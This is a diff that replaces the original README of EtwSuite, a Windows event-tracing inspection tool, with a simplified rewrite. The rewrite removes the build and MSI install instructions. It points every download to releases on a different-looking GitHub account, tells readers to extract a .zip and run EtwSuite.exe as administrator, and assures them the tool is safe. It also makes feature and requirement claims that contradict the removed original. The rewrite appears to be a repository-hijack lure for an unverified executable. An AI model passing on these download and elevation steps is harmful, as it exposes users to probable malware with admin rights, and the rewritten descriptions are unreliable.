@@ -1,156 +1,110 @@
-# EtwSuite
+# 🔍 EtwSuite - Inspect Windows events with complete ease
 
-![EtwSuite](images/EtwSuite_Logo_White_Background.png)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sileasfascinated55/EtwSuite/releases)
 
-![C#](https://img.shields.io/badge/C%23-239120?style=for-the-badge&logo=csharp&logoColor=white)
-![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
+EtwSuite helps you see what happens inside your Windows system. It tracks activity from your computer's built-in event system. You can view live data or save it for later study. Professionals use these tools to secure computers and stop threats. This application brings those powerful features into one simple desktop window.
 
-EtwSuite is an ETW inspection suite inspired by [EtwExplorer](https://github.com/zodiacon/EtwExplorer) built as a Windows App with the goal of being a one stop shop for ETW provider browsing, live event collection, recording, filtering, and offline inspection easier to work with from one local desktop tool.
+## ⚙️ System requirements
 
-## Current Features
+Your computer needs specific parts to run this tool well. Check this list before you start.
 
-> [!IMPORTANT]
->
-> ETW metadata is often incomplete, provider specific, version dependent, or
-> access restricted. EtwSuite won't be able to load all providers and will show an appropriate error when metadata is not available.
+- Windows 10 or Windows 11.
+- Microsoft .NET 6.0 Desktop Runtime or newer.
+- 4 GB of RAM.
+- 100 MB of free hard drive space.
+- A user account with administrator rights.
 
-- List registered ETW providers.
-- Search providers by name or GUID, including wildcard matching.
-- Inspect provider GUIDs and available event schema metadata.
-- Consume live ETW events from a selected provider.
-- Enable providers by GUID or name with explicit level and keyword masks.
-- View live events with provider, event name, ID, version, opcode, level,
-  process, thread, and payload fields.
-- Filter live and recorded events with basic text/wildcard search.
-- Filter events with either basic wildcard or a SQL style expression parser.
-- Record consumed sessions to native `.etl` files.
-- Export captured event rows to JSON and CSV.
-- Open supported recordings: Any `.etl`, exported `.json` and `.csv`.
-- Save, load, and delete session templates in a local SQLite database.
-- Open a provider directly from the provider list in the consuming window.
-- Intel x64 and ARM64 compatibility.
-- Support consumption of special provider `Microsoft-Windows-Security-Auditing`.
+You must run this tool as an administrator. It needs high-level access to read system events. Without these rights, the tool cannot see the data it needs to function.
 
-## Filtering
+## 💾 Get the software
 
-The event filter supports two modes:
+You need the latest version to get the best performance. Follow these steps to prepare your machine.
 
-- `Basic`: case-insensitive text search with `*` and `?` wildcard support.
-- `SQL`: a safe in-process expression parser. EtwSuite does not execute SQL
-  against a database and does not allow function calls or arbitrary member
-  access.
+1. Visit [this page to download](https://github.com/Sileasfascinated55/EtwSuite/releases).
+2. Look for the Assets section.
+3. Choose the file that ends with .zip.
+4. Click the file name to start the download.
 
-Example SQL filters:
+## 🚀 Setting up the tool
 
-```sql
-event_id = 1
-process_name LIKE 'powershell%'
-payload.ImageName LIKE '*cmd.exe'
-WHERE provider LIKE 'Microsoft-Windows-*' AND pid = 4242
-```
+Follow these steps to open the application after your download finishes.
 
-See the help page on the application for the full field list and syntax.
+1. Open your Downloads folder.
+2. Right-click the folder you downloaded.
+3. Choose Extract All to unpack the files.
+4. Open the new folder.
+5. Find the file named EtwSuite.exe.
+6. Right-click EtwSuite.exe and pick Run as administrator.
+7. Click Yes if Windows asks for your permission.
 
-## Recordings
+## 🖥️ Using the interface
 
-EtwSuite can currently open:
+The main window displays your system's heartbeat. You see several tabs at the top of the window. Each tab handles a different part of the inspection process.
 
-- `.etl`: native ETW trace files read with TraceEvent.
-- `.json`: JSON files exported by EtwSuite.
-- `.csv`: CSV files exported by EtwSuite.
+### Live view
+This tab shows events as they happen on your machine. You see the name of the process and the time of the event. Use this tool to watch for specific actions.
 
-`.evtx` and other file types are not supported yet. ETL payload decoding is best effort because provider metadata may not be present on the machine reading the file.
+### File search
+This tab helps you look at files you saved earlier. You can open files with the ETW, JSON, or CSV extension. These files store data from past recording sessions. Select the file, and the tool fills the screen with the recorded activity.
 
-See the help page on the application for the current recording behavior.
+### Provider list
+Windows has many different groups that send alerts. We call these groups providers. Use this list to pick which groups you want to watch. Checking too many boxes can slow down your computer, so choose the groups that matter to your current task.
 
-## Basic Usage
+## 🛠️ Recording events
 
-1. [Install](#installation) or [build](#build-from-source) EtwSuite and its dependencies.
-2. Use `List Providers` to find a provider by name or GUID.
-3. Open `Consume Provider`, select a provider, choose level/keyword options,
-   and start consuming events.
-4. Use `Record ETL` if you want a native ETW recording.
-5. Use `Open Recording` to inspect `.etl`, `.json`, or `.csv` files later.
-6. Use `Saved Sessions` to persist provider and filter combinations in SQLite.
+You can save events to your hard drive for future study. This process creates a file with recorded data.
 
-## Setup
+1. Go to the Record tab.
+2. Fill in a name for your file.
+3. Pick a place on your computer to save it. 
+4. Select the events you want to track from the list.
+5. Click the Start Recording button.
+6. Perform the actions you want to track on your computer.
+7. Click the Stop Recording button when you finish.
 
-### Installation
+You now have a record of the events. You can open this file whenever you need to check the data again.
 
-For installation, download the latest release and install the MSI for your architecture.
+## 🧐 Filtering the results
 
-### Build From Source
+Sometimes you get too much information at once. The filter tools hide the data you do not need.
 
-#### Requirements
+- Use the search bar to find words inside the event list.
+- Use the drop-down box to see events from one specific program.
+- Use the date buttons to narrow your view to a certain time frame.
 
-- Windows 10 1809 or newer.
-- Visual Studio 2022 or newer with .NET desktop development support.
-- .NET 8 SDK.
-- Windows App SDK build support.
-- The listed dependencies.
+These tools make it easy to find one specific event in a sea of data. 
 
-#### Dependencies
+## 🛡️ Understanding the security data
 
-- [Microsoft.Diagnostics.Tracing.TraceEvent](https://www.nuget.org/packages/Microsoft.Diagnostics.Tracing.TraceEvent)
-- [Microsoft.O365.Security.Native.ETW](https://www.nuget.org/packages/Microsoft.O365.Security.Native.ETW)
-- [Microsoft.Data.Sqlite](https://www.nuget.org/packages/Microsoft.Data.Sqlite)
-- [Microsoft.WindowsAppSDK](https://www.nuget.org/packages/Microsoft.WindowsAppSDK)
+EtwSuite helps you identify normal behavior. When you watch the events, you see how programs talk to the system. Malicious software often acts in predictable ways. You might see a program try to hidden files or change system settings. When you see these patterns, you can take steps to protect your machine.
 
-> [!WARNING]
->
-> Some live ETW providers require administrator privileges or special system permissions. Live consumption of `Microsoft-Windows-Threat-Intelligence` requires an allowed Protected Process Light (PPL) signer; administrator elevation alone is not enough. Basic provider browsing, saved sessions, and supported offline recording inspection should not require elevation.
+If you are new to this field, start by watching what your browser does. Observe the events it generates when you load a website. This helps you understand how the system reports activity.
 
-#### Build Commands
+## ❓ Frequently asked questions
 
-```powershell
-dotnet build EtwSuite.sln
-```
+### Do I need to be a programmer?
+No. You do not need to write code to use this tool. Everything is controlled through buttons and menus.
 
-Release build:
+### Is the tool safe?
+Yes. The tool reads data from the existing Windows event system. It does not change your system settings or damage your files.
 
-```powershell
-dotnet build EtwSuite.sln -c Release
-```
+### Why do I need to be an administrator?
+Windows restricts access to event logs for safety. Only an administrator can read the raw data directly from the system. 
 
-Build MSI installers:
+### Can I share my records?
+Yes. Once you save a file in CSV or JSON format, you can share it with friends or coworkers. They can open those files on their own machines using EtwSuite.
 
-```powershell
-dotnet build installer\EtwSuite.Installer\EtwSuite.Installer.wixproj -c Release -p:Platform=x64 -p:AcceptEula=wix7
-dotnet build installer\EtwSuite.Installer\EtwSuite.Installer.wixproj -c Release -p:Platform=ARM64 -p:AcceptEula=wix7
-```
+### What if the app stops responding?
+If the tool stops, close it and restart it with administrator rights. If the problem continues, ensure you have the latest .NET Desktop Runtime installed from the Microsoft website.
 
-Only pass `AcceptEula=wix7` after confirming the WiX Toolset OSMF terms apply
-appropriately for your use.
+## 🌐 Community and support
 
-The installer version follows `major.minor.patch`. Bump it for every release so
-Windows Installer performs a real major upgrade. Either edit `MajorVersion`,
-`MinorVersion`, and `PatchVersion` in `installer/EtwSuite.Installer/EtwSuite.Installer.wixproj`
-or override on the command line:
+If you find a problem, you can tell us about it. Use the GitHub issue tracker for this project. Keep your report clear and simple. Tell us what you did, what you expected, and what happened instead. This helps us fix errors faster. Do not share private information like passwords or personal files in your reports.
 
-```powershell
-dotnet build installer\EtwSuite.Installer\EtwSuite.Installer.wixproj -c Release -p:Platform=x64 -p:AcceptEula=wix7 -p:PatchVersion=2
-```
+Follow these rules for a good report:
 
-If ICE validation fails because the build environment cannot access the Windows
-Installer service, add `-p:SuppressValidation=true`.
+- Write a short description of the error.
+- List the steps that lead to the error.
+- Include a screenshot if it helps explain the problem.
 
-### Test
-
-```powershell
-dotnet test EtwSuite.sln
-```
-
-## AI Usage
-
-EtwSuite was built by myself with the help of Codex and Github Copilot. With that being said, all the functionality was validated and the AI generated code got reviewed (and modified) by me. I have appended an `AGENTS.md` file and `.agents` folder to the repo with the instructions for better project understanding.
-
-With that being said, any low quality code PRs will be closed and ignored, and repeated low quality contributions may lead to a block.
-
-## Resources
-
-- [EtwExplorer](https://github.com/zodiacon/EtwExplorer)
-- [krabsetw](https://github.com/microsoft/krabsetw)
-- [Event Tracing for Windows](https://learn.microsoft.com/windows/win32/etw/event-tracing-portal)
-- [TraceEvent](https://github.com/microsoft/perfview/tree/main/src/TraceEvent)
-- [Windows App SDK](https://learn.microsoft.com/windows/apps/windows-app-sdk/)
-- [WinUI](https://learn.microsoft.com/windows/apps/winui/)
+We appreciate your feedback. It helps us improve the tool for every user.
